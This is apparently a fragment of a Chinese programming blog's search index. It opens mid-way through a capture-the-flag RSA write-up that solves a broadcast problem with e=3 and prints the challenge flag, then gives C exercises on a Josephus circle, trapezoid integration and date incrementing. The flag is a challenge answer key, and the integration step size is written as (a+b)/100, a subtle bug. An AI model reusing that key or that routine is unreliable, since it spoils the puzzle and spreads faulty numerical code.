class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure><h4 id="buuctf-RSA4"><a href="#buuctf-RSA4" class="headerlink" title="buuctf RSA4"></a>buuctf RSA4</h4><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">N = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004 </span><br><span class="line">c = 310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span><br><span class="line"></span><br><span class="line">N = 302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114 </span><br><span class="line">c = 112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span><br><span class="line"></span><br><span class="line">N = 332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323 </span><br><span class="line">c = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span><br></pre></td></tr></table></figure><p>有相同的加密指数e，这里由中国剩余定理可以知道e&#x3D;3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa</span>(<span class="params">n1, c1, n2, c2, n3, c3</span>):</span><br><span class="line">    M1 = n2 * n3</span><br><span class="line">    M2 = n1 * n3</span><br><span class="line">    M3 = n1 * n2</span><br><span class="line">    m_e = (c1 * M1 * invert(M1, n1) + c2 * M2 * invert(M2, n2) + c3 * M3 * invert(M3, n3)) % (n1 * n2 * n3)</span><br><span class="line">    <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        m = iroot(m_e, e)</span><br><span class="line">        <span class="keyword">if</span> m[<span class="number">1</span>]:</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span></span><br><span class="line">c1 = <span class="number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span></span><br><span class="line">c2 = <span class="number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span></span><br><span class="line">c3 = <span class="number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="built_in">int</span>(<span class="built_in">str</span>(n1), <span class="number">5</span>)</span><br><span class="line">c1 = <span class="built_in">int</span>(<span class="built_in">str</span>(c1), <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n2 = <span class="built_in">int</span>(<span class="built_in">str</span>(n2), <span class="number">5</span>)</span><br><span class="line">c2 = <span class="built_in">int</span>(<span class="built_in">str</span>(c2), <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n3 = <span class="built_in">int</span>(<span class="built_in">str</span>(n3), <span class="number">5</span>)</span><br><span class="line">c3 = <span class="built_in">int</span>(<span class="built_in">str</span>(c3), <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">rsa(n1, c1, n2, c2, n3, c3)</span><br></pre></td></tr></table></figure><p>flag: noxCTF{D4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd!}</p>]]></content>
      
      
      <categories>
          
          <category> reserve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>顺序淘汰问题</title>
      <link href="/2023/03/30/%E9%A1%BA%E5%BA%8F%E6%B7%98%E6%B1%B0%E9%97%AE%E9%A2%98/"/>
      <url>/2023/03/30/%E9%A1%BA%E5%BA%8F%E6%B7%98%E6%B1%B0%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="顺序淘汰问题"><a href="#顺序淘汰问题" class="headerlink" title="顺序淘汰问题"></a>顺序淘汰问题</h1><p>问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">13个人围成一圈，从第1个人开始顺序报号1、2、3，凡报到3的人退出圈子。找出最后留在圈子里的人原来的序号。要求用结构体编程实现。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">***输出提示：&quot;\n出圈成员及顺序：&quot;</span><br><span class="line">***输出格式：&quot;%3d&quot;</span><br><span class="line">***输出提示：&quot;\n最后的成员是：&quot;</span><br><span class="line">***输出格式：&quot;%3d&quot;</span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> num;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">    </span><br><span class="line">&#125;Node;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    Node *head,*p,*q;<span class="comment">//设置指针，用来索引链表</span></span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    head=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    head-&gt;num=<span class="number">1</span>;</span><br><span class="line">    p=head;</span><br><span class="line">    <span class="comment">//初始化链表</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=<span class="number">13</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        q=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        p-&gt;next=q;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">        p-&gt;num=i;</span><br><span class="line">    &#125;</span><br><span class="line">    p-&gt;next=head;<span class="comment">//将链表连成环</span></span><br><span class="line">    p=head;<span class="comment">//将索引指针指向链表头</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n出圈成员及顺序：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">12</span>;i++)<span class="comment">//进行12次循环，淘汰12名选手</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;<span class="number">3</span>;j++)<span class="comment">//从第一个开始，连续跳两次相当于就数到了三</span></span><br><span class="line">        &#123;</span><br><span class="line">            q=p;</span><br><span class="line">            p=p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>,p-&gt;num);</span><br><span class="line">        q-&gt;next=p-&gt;next;<span class="comment">//将报三的数前后连接，使链表跳过三</span></span><br><span class="line">        <span class="built_in">free</span>(p);<span class="comment">//将数到三的成员free掉</span></span><br><span class="line">        p=q-&gt;next;<span class="comment">//重新指向下一位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n最后的成员是：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%3d&quot;</span>,p-&gt;num);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>链表的基本运用。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言实例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用梯形法求函数积分</title>
      <link href="/2023/03/26/%E7%94%A8%E6%A2%AF%E5%BD%A2%E6%B3%95%E6%B1%82%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86/"/>
      <url>/2023/03/26/%E7%94%A8%E6%A2%AF%E5%BD%A2%E6%B3%95%E6%B1%82%E5%87%BD%E6%95%B0%E7%A7%AF%E5%88%86/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="梯形法求函数积分"><a href="#梯形法求函数积分" class="headerlink" title="梯形法求函数积分"></a>梯形法求函数积分</h1><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">按如下函数原型，采用梯形法编程实现(分成100个小梯形,再求这100个梯形面积的和)，在积分区间[a,b]内计算函数y1=∫(1+x*x)dx (从0积到1）和y2=∫x/(1+x*x)dx (从0积到3）的定积分。其中，指向函数的指针变量f用于接收被积函数的入口地址。</span><br><span class="line"></span><br><span class="line">Integral(float (*f)(float), float a, float b);</span><br><span class="line"></span><br><span class="line">**输出格式要求：&quot;y1=%f\ny2=%f\n&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//将两个积分函数运算写出</span></span><br><span class="line"><span class="type">float</span> <span class="title function_">func1</span><span class="params">(<span class="type">float</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>+x*x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">float</span> <span class="title function_">func2</span><span class="params">(<span class="type">float</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x/(<span class="number">1</span>+x*x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//运用梯形法求积分</span></span><br><span class="line"><span class="type">float</span> <span class="title function_">Integral</span><span class="params">(<span class="type">float</span> (*f)(<span class="type">float</span>), <span class="type">float</span> a, <span class="type">float</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> sum=<span class="number">0</span>,h;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    h=(a+b)/<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum+=(f(a+i*h)+f(a+(i+<span class="number">1</span>)*h))*h/<span class="number">2</span>;<span class="comment">//上底加下底乘以高除以2</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">float</span> y1,y2;</span><br><span class="line">    y1=Integral(func1,<span class="number">0.0</span>,<span class="number">1.0</span>);</span><br><span class="line">    y2=Integral(func2,<span class="number">0.0</span>,<span class="number">3.0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;y1=%f\ny2=%f\n&quot;</span>,y1,y2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tomorrow</title>
      <link href="/2023/03/22/tomorrow/"/>
      <url>/2023/03/22/tomorrow/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="输出明天的时间"><a href="#输出明天的时间" class="headerlink" title="输出明天的时间"></a>输出明天的时间</h1><p>题目：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">给定如下定义：</span><br><span class="line">struct date_rec</span><br><span class="line">  &#123;</span><br><span class="line">    int day ;</span><br><span class="line">    int month ;</span><br><span class="line">    int year ;</span><br><span class="line">  &#125; ;</span><br><span class="line">  struct date_rec current_date ;</span><br><span class="line">写一个程序包含如下的函数，完成：</span><br><span class="line">(a) 输入current_date的值：</span><br><span class="line">void input_date(struct date_rec *current_date)</span><br><span class="line">(b) 将current_date增加1天：</span><br><span class="line">void increment_date(struct date_rec *current_date)</span><br><span class="line">(c) 显示current_date的值：</span><br><span class="line">void output_date(struct date_rec *current_date)</span><br><span class="line">考虑每个月的实际天数，同时也考虑闰年的情况。</span><br><span class="line"></span><br><span class="line">**输入格式要求：&quot;%d%d%d&quot; 提示信息：&quot;请输入当前日期（年 月 日）：&quot;</span><br><span class="line">**输出格式要求：&quot;当前日期：%d年%d月%d日！&quot; （加1天后的新日期）</span><br><span class="line"></span><br><span class="line">程序运行示例：</span><br><span class="line">请输入当前日期（年 月 日）：2020 5 20</span><br><span class="line">当前日期：2020年5月21日！</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">date_rec</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">int</span> day ;</span><br><span class="line">    <span class="type">int</span> month ;</span><br><span class="line">    <span class="type">int</span> year ;</span><br><span class="line">  &#125; ;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">input_date</span><span class="params">(<span class="keyword">struct</span> date_rec *current_date)</span>;<span class="comment">//今天的时间</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">increment_date</span><span class="params">(<span class="keyword">struct</span> date_rec *current_date)</span>;<span class="comment">//计算明天的时间</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">output_date</span><span class="params">(<span class="keyword">struct</span> date_rec *current_date)</span>;<span class="comment">//输出明天的时间</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">date_rec</span> *<span class="title">today</span>=</span><span class="built_in">malloc</span>(<span class="number">50</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    input_date(today);</span><br><span class="line">    increment_date(today);</span><br><span class="line">    output_date(today);</span><br><span class="line">    <span class="built_in">free</span>(today);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">input_date</span><span class="params">(<span class="keyword">struct</span> date_rec *current_date)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入当前日期（年 月 日）：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;current_date-&gt;year,&amp;current_date-&gt;month,&amp;current_date-&gt;day);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">increment_date</span><span class="params">(<span class="keyword">struct</span> date_rec *current_date)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(current_date-&gt;month==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(current_date-&gt;year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;current_date-&gt;year%<span class="number">100</span>!=<span class="number">0</span>||current_date-&gt;year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(current_date-&gt;day==<span class="number">29</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                current_date-&gt;day=<span class="number">1</span>;</span><br><span class="line">                current_date-&gt;month+=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            current_date-&gt;day+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(current_date-&gt;day==<span class="number">28</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            current_date-&gt;day=<span class="number">1</span>;</span><br><span class="line">            current_date-&gt;month+=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            current_date-&gt;day+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(current_date-&gt;month==<span class="number">1</span>||current_date-&gt;month==<span class="number">3</span>||current_date-&gt;month==<span class="number">5</span>||current_date-&gt;month==<span class="number">7</span>||current_date-&gt;month==<span class="number">8</span>||current_date-&gt;month==<span class="number">10</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(current_date-&gt;day==<span class="number">31</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            current_date-&gt;day=<span class="number">1</span>;</span><br><span class="line">            current_date-&gt;month+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        current_date-&gt;day+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(current_date-&gt;month==<span class="number">12</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(current_date-&gt;day==<span class="number">31</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            current_date-&gt;day=<span class="number">1</span>;</span><br><span class="line">            current_date-&gt;month=<span class="number">1</span>;</span><br><span class="line">            current_date-&gt;year+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        current_date-&gt;day+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(current_date-&gt;day==<span class="number">30</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            current_date-&gt;day=<span class="number">1</span>;</span><br><span class="line">            current_date-&gt;month+=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        current_date-&gt;day+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">output_date</span><span class="params">(<span class="keyword">struct</span> date_rec *current_date)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;当前日期：%d年%d月%d日!&quot;</span>,current_date-&gt;year,current_date-&gt;month,current_date-&gt;day);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构体的基本运用。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言实例 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>卡布列克运算</title>
      <link href="/2023/03/22/%E5%8D%A1%E5%B8%83%E5%88%97%E5%85%8B%E8%BF%90%E7%AE%97/"/>
      <url>/2023/03/22/%E5%8D%A1%E5%B8%83%E5%88%97%E5%85%8B%E8%BF%90%E7%AE%97/</url>
      
